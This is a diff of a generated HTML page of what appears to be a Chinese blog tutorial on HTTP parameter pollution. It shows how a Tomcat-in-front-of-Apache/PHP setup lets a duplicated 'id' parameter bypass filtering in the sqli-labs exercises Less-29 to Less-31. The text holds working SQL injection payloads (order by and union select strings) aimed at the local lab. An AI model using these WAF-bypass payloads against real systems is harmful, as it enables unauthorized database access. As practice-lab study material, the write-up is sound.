@@ -5,9 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="SQL注入-HPP, 小白">
-    <meta name="description" content="##服务器两层架构
+    <meta name="description" content="[TOC]
+##服务器两层架构
 
-服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问">
+服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -480,7 +481,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    960
+                    962
                 </div>
                 
 
@@ -505,7 +506,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>##服务器两层架构</p>
+                <p>[TOC]</p>
+<p>##服务器两层架构</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210131503726.png" alt="image-20220210131503726"></p>
 <p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
 <p><strong>大多数服务器对于参数解析的介绍：</strong></p>
@@ -548,9 +550,8 @@
 <p>对于上图服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。返回的数据也就是 apache 处理的数据，id=2。</p>
 <h2 id="HTTP参数污染（HPP）"><a href="#HTTP参数污染（HPP）" class="headerlink" title="HTTP参数污染（HPP）"></a>HTTP参数污染（HPP）</h2><p>由于服务器两层架构，往往tomcat服务器进行数据的过滤和处理，功能类似为一个WAF，通常利用此特性进行WAF绕过。</p>
 <hr>
-<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>记录一下Less-29–Less-31靶场的HPP</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-29</strong></p>
-<p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p>
+<h2 id="HPP靶场"><a href="#HPP靶场" class="headerlink" title="HPP靶场"></a>HPP靶场</h2><p>记录一下Less-29–Less-31靶场的HPP</p>
+<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p>
 <p>首先需要打开login.php文件，不然这Less-29和Less-1没什么区别</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -564,12 +565,12 @@
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210144917098.png" alt="image-20220210144917098"></p>
 <p>从跳转到<code>.jsp</code>页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）</p>
 <p>参考原文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/li2019/p/12378585.html">https://www.cnblogs.com/li2019/p/12378585.html</a></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p>
+<h2 id="绕WAF"><a href="#绕WAF" class="headerlink" title="绕WAF"></a>绕WAF</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id=2</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210145231054.png" alt="image-20220210145231054"></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>判断字段数：</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>判断字段数：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>由于对id值的处理需要<code>&#39;</code>，所以第二个参数需要进行单引号闭合</p>
@@ -581,8 +582,7 @@
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150050418.png" alt="image-20220210150050418"></p>
 <p>后续过程的payload与以往相同。</p>
 <hr>
-<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-30</strong></p>
-<p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p>
+<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150434136.png" alt="image-20220210150434136"></p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2
@@ -590,8 +590,7 @@ http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#
 http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <hr>
-<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-31</strong></p>
-<p>Less-31对id值进行了<code>&quot;)</code>的处理。</p>
+<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>Less-31对id值进行了<code>&quot;)</code>的处理。</p>
 <p><img src="/2022/02/10/SQL%E6%B3%A8%E5%85%A5-HPP/image-20220210150938265.png" alt="image-20220210150938265"></p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2
@@ -1039,7 +1038,7 @@ http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">34.5k</span>
+                        class="white-color">34.7k</span>
             
             
             
